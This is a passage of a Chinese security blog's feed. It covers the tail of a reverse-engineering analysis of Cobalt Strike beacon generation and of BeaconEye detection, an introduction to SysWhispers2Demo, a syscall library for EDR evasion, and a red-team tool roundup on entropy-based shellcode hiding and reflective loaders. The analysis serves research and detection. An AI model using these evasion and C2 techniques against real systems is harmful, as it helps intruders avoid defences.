alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是将<code>decomplie_src</code>复制到<code>src</code>中，这里直接将网上编译的那个版本的src目录复制到本项目的<code>src</code>目录中，如果有其他需求可以自己从<code>decomplie_src</code>复制添加即可。<br>    <img src="http://hacky.wang/blog/20220624/KQNB44PIg1kw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Build --&gt;Build Artifacts --&gt;Build</code>进行编译。在out目录就可以看到生成的.jar文件。<br>    <img src="http://hacky.wang/blog/20220624/KNJt0CWWtRNk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Run --&gt; Profile--&gt;Edit...</code>编辑配置，选择“+”号，在JAR Application添加一个配置文件。在<code>Path to jar</code>选择编译生成的jar包路径。在<code>VM Optionals</code>填入<code>-XX:+AggressiveHeap -XX:+UseParallelGC</code><br>    <img src="http://hacky.wang/blog/20220624/pRronaNRd0QF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以后每次要运行或者调试的时候，都可以<code>Run--&gt;Profile--&gt;Run(debug)</code><br>    <img src="http://hacky.wang/blog/20220624/Pr7DFcptxIjA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后就完成了。<br>    <img src="http://hacky.wang/blog/20220624/LhpRo180mPGe.png?imageslim" alt="mark"></p><h2 id="0x02-beacon生成原理"><a href="#0x02-beacon生成原理" class="headerlink" title="0x02 beacon生成原理"></a>0x02 beacon生成原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon生成主要有3个步骤，首先是将C2Patch的相关数据patch到beacon中，便于beacon使用，第二步，处理beacon的PE数据和添加引导shellcode，这段shellcode是引导执行ReflectiveLoader。第三步将beacon加密，并和一些数据patch到loader中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon生成这块，主要涉及到4个java文件。BeaconPayload.java主要是对beacon进行C2Profile相关的处理，主要涉及的函数为<code>exportBeaconStage</code>。MalleablePE.java，主要用于对beacon进行一些PE相关的处理，主要涉及的函数为<code>process</code>函数。而BeaconLoader.java主要是patch beacon的开头那段shellcode。主要涉及到<code>patchDOSHeader</code>函数。BaseArtifactUtils主要是将加密beacon数据和一些加密beacon的key之类的数据patch到loader模板上，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CobaltStrike服务端，通过()生成beacon，经过分析，将断点分别下在<code>WindowsExecutableStageDialog.dialogAction</code>和<code>WindowsExecutableStageDialog.dialogResult</code>这两个函数处。通过 dialogAction函数，选择需要保存的文件的内容或者格式。然后调用<code>SafeDialogs.saveFile</code>函数，弹出保存文件的选择框。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>dialogResult</code>函数，dialogResult函数是生成beacon的主要流程，参数的参数var1表示保存beacon的路径。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;依次获取架构类型(x86或者x64)，然后监听器这里选的是reverse_http。<br>    <img src="http://hacky.wang/blog/20220623/QSe5gp6RBP5h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用<code>ScListener.export</code>函数,export函数的作用是通过不同的监听器，选择不同的Stage。本例中是调用eaconPayload.exportBeaconStageHTTP函数。exportBeaconStageHTTP的参数分别是(var1)端口，(var2)链接地址，var3，var4分别是false，var5是架构。通过不同的架构选择不同的BeaconStage数据。<br>    <img src="http://hacky.wang/blog/20220623/rJjcOad9snpb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/7INX6IdrJkKe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>exportBeaconStage</code>函数中，首先调用<code>SleevedResource.readResource</code>加载指定的beacon原始文件<br>    <img src="http://hacky.wang/blog/20220623/C48efyX0dfK6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取C2Profile中的uri等C2Profile信息。我曾经根据这些默认的C2Profile的URI信息，捞到过一批有价值的CobaltStrike样本。<br>    <img src="http://hacky.wang/blog/20220623/D83MeRV78tAw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/A4UuK5aWOAXl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析完C2Profile数据之后，就会按照一定的顺序将这些C2Profile的参数拼装起来，并patch到beacon中，以供beacon使用。<br>    <img src="http://hacky.wang/blog/20220623/bu0YQ14ummLY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/uYJiQEmLmNSl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>beacon\BeaconConstants.java</code>这个文件中，可以看到C2Profile数据拼接序号的含义。在之前分析exportBeaconStageHTTP参数的时候，var1为端口。可以看到这里第二个处理的就是端口。而<code>beacon\BeaconConstants.java</code>文件的第二项的内容也是端口。<br>    <img src="http://hacky.wang/blog/20220623/NTpTzsELKAWb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/YQ1tnjtbB2AN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拼接C2Profile数据的是和，CobaltStrike使用<code>addShort</code>,<code>addInt</code>,<code>addData</code>,<code>addString</code>四个函数添加数据。其中前三个为基本函数，<code>addString</code>底层是通过<code>addData</code>实现的。以addData为例子，通过分析参数，可知依次添加了index，type，length，和value。且如果是short类型，type为1，如果是int类型，type为2，如果是Data或者string类型呢，type就为3了。<br>    <img src="http://hacky.wang/blog/20220623/S9zasGjerEo7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/AdwyrgXHhL1Y.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/KERO9tQq3u5y.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将这些数据转化为byte类型，然后将其与46进行进行异或运算。<br>    <img src="http://hacky.wang/blog/20220623/pxWGVGjqc0x1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将读取的原始beacon文件的byte转化为string类型，并定位其中的“AAAABBBBCCCCDDDDEEEEFFFF”字符串。然后用C2Profile数据替换掉。<br>    <img src="http://hacky.wang/blog/20220623/q9NJ8sBWPW3i.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当C2Profile的数据patch到beacon之后呢，开始处理PE数据，CobaltStrike在处理PE数据的时候分为两部，首先会对PE数据进行预处理，也就是从C2Profile中读取关于PE处理的相关数据，例如image_size，compile_time等等，然后对这些PE的基础数据进行处理。<br>    <img src="http://hacky.wang/blog/20220623/qCRTUnlNqiKV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在对PE数据进行预处理之后呢，根据所选择的架构不同，patch DOS头，也就是前面那段shellcode。首先调用findReflectiveLoader函数，通过导出表获取<code>ReflectiveLoader</code>导出函数地址。然后将该地址填充到shellcode中，其实分析过这种stage类型的beacon会发现，这种payload本质就是一个PE文件，只不过PE头被修改成一段可以执行的shellcode，这个shellcode的目的就是引导至ReflectiveLoader函数。<br>    <img src="http://hacky.wang/blog/20220623/obL6hTFYlzJB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造合适的Loader,在<code>_patchArtifact</code>函数中，首先读取指定的Loader的模板，该模板位于resources/目录下面，然后生成一组随机的byte数组，并用这些数组对beacon进行异或加密，这也是为什么每个生成的beacon都是不一样的原因。<br>    <img src="http://hacky.wang/blog/20220623/Gh1YbaAyjc8N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后依次保存1024个A所在地址偏移+16这个地址，beacon的长度，异或加密的随机数组，GetModuleHandleA，GetProcAddress函数地址(如果可以的话)，保存加密之后的beacon数据，将上述数据替换到那1024个A处。然后将byte[]写入指定文件即完成beacon的生成。<br>    <img src="http://hacky.wang/blog/20220623/cs0HIULgMsED.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/4ouN66Vuhwxy.png?imageslim" alt="mark"></p><h2 id="0x03-beacon分析调试"><a href="#0x03-beacon分析调试" class="headerlink" title="0x03 beacon分析调试"></a>0x03 beacon分析调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面分析，cobalt strike 的stage模式从loader通过CreateThread执行beacon。经过一小段shellcode之后，执行<code>ReflectiveLoader</code>，在<code>ReflectiveLoader</code>处理完PE数据之后，其实是跳转到了DllEntryPoint函数。此处将重点分析beacon对于C2Profile的解析过程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，在beacon中，第一个函数的作用是定位当前EIP,第二个函数即就是<code>ReflectiveLoader</code>,经过对PE的一些处理之后，最后会执行<code>DllEntryPoint</code>.<br>    <img src="http://hacky.wang/blog/20220623/kxXhOy4zXodd.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/tblBaWchlHIo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在dwReason为1的时候初始化C2Profile数据，在<code>Sub_339762_Parse_C2Profile</code>函数中，很显然，可以看到将C2Profile进行了解密。在内存中，大概还是以 index，type，length，value的顺序进行分布。<br>    <img src="http://hacky.wang/blog/20220623/Co980Xfz8Qft.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/E6oG4a0EWkvk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取整个解密数据，解析出type和value，只将这两项目保存到刚刚malloc的内存中。并且将type和value从偏移为8的地址处开始保存。而这一部分数据的分布顺序就是一些检测工具，例如BeaconEye的检测原理。<br>    <img src="http://hacky.wang/blog/20220623/AMvYidsfiWhw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/3ezQKal3H90V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实，往下面翻一番是能找到所链接的server的。<br>    <img src="http://hacky.wang/blog/20220623/P22QPaHCPWFk.png?imageslim" alt="mark"></p><h2 id="0x04-BeaconEye原理分析"><a href="#0x04-BeaconEye原理分析" class="headerlink" title="0x04 BeaconEye原理分析"></a>0x04 BeaconEye原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BeaconEye使用C#开发，通过使用yara规则，检测beacon解析之后的C2Profile数据分布实现的。因为libyaraNET库没有x86版本，所以BeaconEye务必编译成X64版本，才可以通过。<br>    <img src="http://hacky.wang/blog/20220623/aa4p8A9xCnKh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以x86的yara规则举例子，yara第一段为全0，因为C2Profile数据是从+0x08处开始复制的，所以前八个字节没有数据为全0，剩下的数据就很简单了，根据解析C2Profile的变量类型来看，前六个数据类型分别是short，short，int，int，short，short对应的type分别是01，01,02,02,01,01。这样就是检测的原理。<br>    <img src="http://hacky.wang/blog/20220623/ULBCsrwcULaa.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/SXcP7yx4SrxN.png?imageslim" alt="mark"></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="https://blog.51cto.com/u_15274949/2931535" target="_blank" rel="external">CobaltStrike二次开发环境初探</a></li><li><a href="https://xz.aliyun.com/t/10784" target="_blank" rel="external">CobaltStrike逆向学习系列(2)：Stageless Beacon 生成流程分析</a></li><li><a href="https://xz.aliyun.com/t/10785" target="_blank" rel="external">CobaltStrike逆向学习系列(3)：Beacon C2Profile 解析</a></li><li><a href="https://xz.aliyun.com/t/10832" target="_blank" rel="external">CobaltStrike逆向学习系列(5)：Bypass BeaconEye</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言与背景&quot;&gt;&lt;a href=&quot;#0x00-前言与背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言与背景&quot;&gt;&lt;/a&gt;0x00 前言与背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;n
      
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SysWhispers2Demo 简介</title>
    <link href="https://findream.github.io/2022/06/25/SysWhispers2Demo/"/>
    <id>https://findream.github.io/2022/06/25/SysWhispers2Demo/</id>
    <published>2022-06-25T06:02:11.000Z</published>
    <updated>2022-06-25T14:32:29.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-项目简介"><a href="#0x00-项目简介" class="headerlink" title="0x00 项目简介"></a>0x00 项目简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，<strong>部分采用最小开发原则</strong>，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:<a href="https://github.com/findream/SysWhispers2Demo" target="_blank" rel="external">https://github.com/findream/SysWhispers2Demo</a></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhispers2</a>主要是由jthuraisamy开发的通过Syscall用来规避EDR。SysWhispers2使用很方便，无需指定windows 操作系统版本，只需要通过syswhispers.py生成Nt*函数所需要的函数参数，调用约定等。但是，Ring3的逻辑需要自己实现，这就是SysWhispers2Demo的目的。</p><h2 id="0x01-文件描述"><a href="#0x01-文件描述" class="headerlink" title="0x01 文件描述"></a>0x01 文件描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo主要有3个文件<code>SysWhispers2Demo.cpp</code>,<code>SysWhispers2Demo.h</code>,<code>prototypes.h</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SysWhispers2Demo.cpp文件是Ring3层的实现逻辑。目前，主要实现了包括文件操作，注册表操作，进程操作，以及线程操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件操作，基本实现了文件的创建，读写，删除等操作，具体支持的Win32 API如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateFileA</span></div><div class="line"><span class="attribute">CreateFileW</span></div><div class="line"><span class="attribute">ReadFile</span></div><div class="line"><span class="attribute">WriteFile</span></div><div class="line"><span class="attribute">NtQueryInformationFile</span></div><div class="line"><span class="attribute">NtSetInformationFile</span></div><div class="line"><span class="attribute">NtOpenFile</span></div><div class="line"><span class="attribute">NtQueryDirectoryFile</span></div><div class="line"><span class="attribute">DeleteFileA</span></div><div class="line"><span class="attribute">DeleteFileW</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注册表操作，也实现了注册表使用的常见API函数,支持两种ANSI和UNICODE字符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">RegCreateKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegCreateKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegSetValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegDeleteValueA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegQueryValueExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegOpenKeyA</span><span class="params">(W)</span></span></div><div class="line">RegCloseKey</div><div class="line"><span class="function"><span class="title">RegQueryInfoKeyA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyExA</span><span class="params">(W)</span></span></div><div class="line"><span class="function"><span class="title">RegEnumKeyA</span><span class="params">(W)</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程操作，也实现了常见的进程使用的API函数。<strong><em>因为CreateProcess内部实现的过于复杂，目前仅仅实现了能创建进程，但是创建进程之后，需要传出的参数，如ProcessInformation没有实现</em></strong><br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcessA</span><span class="params">(W)</span></span></div><div class="line">WinExec</div><div class="line">OpenProcess</div><div class="line">TerminateProcess</div><div class="line">ReadProcessMemory</div><div class="line">WriteProcessMemory</div><div class="line">GetExitCodeProcess</div><div class="line">GetLogicalProcessorInformation</div><div class="line">GetProcessAffinityMask</div><div class="line">IsWow64Process</div><div class="line">GetProcessId</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程操作，也实现了常见的线程使用的API函数。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">CreateThread</span></div><div class="line"><span class="attribute">CreateRemoteThreadEx</span></div><div class="line"><span class="attribute">ResumeThread</span></div><div class="line"><span class="attribute">OpenThread</span></div><div class="line"><span class="attribute">GetThreadContext</span></div><div class="line"><span class="attribute">GetExitCodeThread</span></div><div class="line"><span class="attribute">GetProcessIdOfThread</span></div><div class="line"><span class="attribute">TerminateThread</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo.h是头文件，包含了SysWhispers2Demo.cpp的函数声明，和库所需要Nt*函数指针。前面typedef包含的是函数指针，后面是函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了增强开发的方便程度，SysWhispers2Demo采用的是和win32 API同样的函数原型，使用SysWhispers2Demo就像使用原生的Win32一模一样。仅仅需要在你所需要的Win32 API名称后面加一个Stub以示区别，例如，假如需要使用NtCreateFile创建文件，那么在Ring3需要调用CreateFileA，那只需要调用SysWhispers2Demo内置的CreateFileA_Stub。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prototypes.h包含的是一些所需要的变量类型等数据。这个是我删除了ntdll.h文件的函数声明。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面三个文件，在使用的时候，需要导入新项目。除此以外，还有两个文件，ntdll.h存储了一些函数声明和遍历类型，使用者可以在这里查看函数原型。而main.cpp我写的部分测试用例，是关于部分Win32 API的使用。<strong>这两个文件不需要导入项目。</strong></p><h2 id="0x02-使用步骤"><a href="#0x02-使用步骤" class="headerlink" title="0x02 使用步骤"></a>0x02 使用步骤</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo仅仅支持x64，x86在Syscall会遇到莫名其妙的问题，可以解决，但是不具有通用性，暂时不考虑支持x86。在win10 x64 vs2017编译通过。其他未测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在你使用SysWhispers2生成了文件之后，假设生成了文件是<code>syscall.c</code>,<code>syscall.h</code>，以及<code>syscall.asm</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步，在生成的syscall.h文件中，删除所有的变量定义。因为SysWhispers2会生成变量定义，而SysWhispers2Demo也带有变量定义，两者会冲突。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩，在生成的Syscall.h文件中，导入prototypes.h头文件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三歩，在SysWhispers2Demo库文件SysWhioers2Demo.c文件中，导入syscall.h头文件，目的是修改链接的Nt函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步，注释SysWhispers2Demo库文件SysWhioers2Demo.c文件中，指定函数的动态获取函数地址的语句。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除此以外，也可以选择直接Copy SysWhispers2Demo.cpp中，你想要使用的函数。 No Care！这应该是最容易的。</p><h2 id="0x03-版本信息"><a href="#0x03-版本信息" class="headerlink" title="0x03 版本信息"></a>0x03 版本信息</h2><h3 id="v0-1-0（2022-06-20）"><a href="#v0-1-0（2022-06-20）" class="headerlink" title="v0.1.0（2022-06-20）"></a>v0.1.0（2022-06-20）</h3><ul><li>初始版本，支持常见的文件，注册表，进程，线程 API操作。</li></ul><h2 id="0x04-协议"><a href="#0x04-协议" class="headerlink" title="0x04 协议"></a>0x04 协议</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接用就是了。</p><h2 id="0x05-FAQ"><a href="#0x05-FAQ" class="headerlink" title="0x05 FAQ"></a>0x05 FAQ</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;欢迎大家提PR</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果还有需要实现的kernel层API函数，或者bug，欢迎联系wanghacky@qq.com。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-项目简介&quot;&gt;&lt;a href=&quot;#0x00-项目简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 项目简介&quot;&gt;&lt;/a&gt;0x00 项目简介&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，&lt;strong&gt;部分采用最小开发原则&lt;/strong&gt;，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:&lt;a href=&quot;https://github.com/findream/SysWhispers2Demo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/findream/SysWhispers2Demo&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="windows 攻防" scheme="https://findream.github.io/categories/windows-%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.28-6.2）学习</title>
    <link href="https://findream.github.io/2022/06/14/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.5.28-6.2%EF%BC%89/"/>
    <id>https://findream.github.io/2022/06/14/绿盟科技-每周蓝军技术推送（2022.5.28-6.2）/</id>
    <published>2022-06-14T06:02:11.000Z</published>
    <updated>2022-06-14T13:09:49.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）"><a href="#0x00-绿盟科技-每周蓝军技术推送（2022-5-28-6-2）" class="headerlink" title="0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）"></a>0x00 绿盟科技-每周蓝军技术推送（2022.5.28-6.2）</h2><ul><li>原文链接：<a href="https://mp.weixin.qq.com/s/aZ3Af7xHOuqKGI_R89U0Fg" target="_blank" rel="external">每周蓝军技术推送（2022.5.28-6.2</a></li><li>这一周的内容推送主要是一些工具推荐</li><li>释放UDRL（用户定义反射加载器）内存的BOF</li><li>基于低熵的香农编码隐藏shellcode</li><li>Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</li><li>C# 编写的 COM 劫持持久化辅助工具<a id="more"></a></li></ul><h2 id="0x01-调试和逆向ALPC"><a href="#0x01-调试和逆向ALPC" class="headerlink" title="0x01 调试和逆向ALPC"></a>0x01 调试和逆向ALPC</h2><ul><li>ALPC调试比较复杂没有仔细看。除了<a href="https://csandker.io/2022/05/29/Debugging-And-Reversing-ALPC.html" target="_blank" rel="external">这篇文章(调试和逆向ALPC)</a>之外，还有<a href="https://bbs.pediy.com/thread-268225.htm" target="_blank" rel="external">win10 1909逆向（ALPC通信原理浅析</a>等可以参考。</li></ul><h2 id="0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"><a href="#0x02-freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF" class="headerlink" title="0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF"></a>0x02 freeBokuLoader：释放UDRL（用户定义反射加载器）内存的BOF</h2><ul><li>这就是一个释放UDRL(用户定义反射加载器)的BOF。</li><li>BOF:即Beacon Object Files。是c编译后的文件，其有点就是小，可以在beacon内部使用，缺点就是会引发beacon崩溃。</li><li>关于BOF，可以看官方出的<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">文章</a></li></ul><h2 id="0x03-Shelltropy：基于低熵的香农编码隐藏shellcode"><a href="#0x03-Shelltropy：基于低熵的香农编码隐藏shellcode" class="headerlink" title="0x03 Shelltropy：基于低熵的香农编码隐藏shellcode"></a>0x03 Shelltropy：基于低熵的香农编码隐藏shellcode</h2><ul><li>一个概念：信息熵/香农熵：一组信息中随机性的量度，信息越随机，熵越高。</li><li>一个重要结论：bin通过加密混淆或者加壳，会导致信息熵增加。多数恶意软件，信息熵偏高。</li><li>如何降低熵，规避EDR：之前了解过，将加密数据嵌入正常的可执行文件可以避免高熵。</li><li>Shelltropy作者所写的<a href="https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/" target="_blank" rel="external">文章</a>的思路是通过向高熵的数据中插入低熵的数据，可以将整体的熵降低。但是这么做会使shellcode增大一倍。<br> <img src="http://hacky.wang/blog/20220613/Lk1z89W0zf5w.png?imageslim" alt="mark"></li><li>Ref：<a href="https://github.com/kleiton0x00/Shelltropy/blob/main/README.md" target="_blank" rel="external">https://github.com/kleiton0x00/Shelltropy/blob/main/README.md</a></li></ul><h2 id="0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"><a href="#0x04-KaynStrike：Cobalt-Strike-Beacon-的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放" class="headerlink" title="0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放"></a>0x04 KaynStrike：Cobalt Strike Beacon 的用户定义反射加载器，伪造线程起始地址并在执行入口点后释放</h2><ul><li><a href="https://github.com/Cracked5pider/KaynStrike" target="_blank" 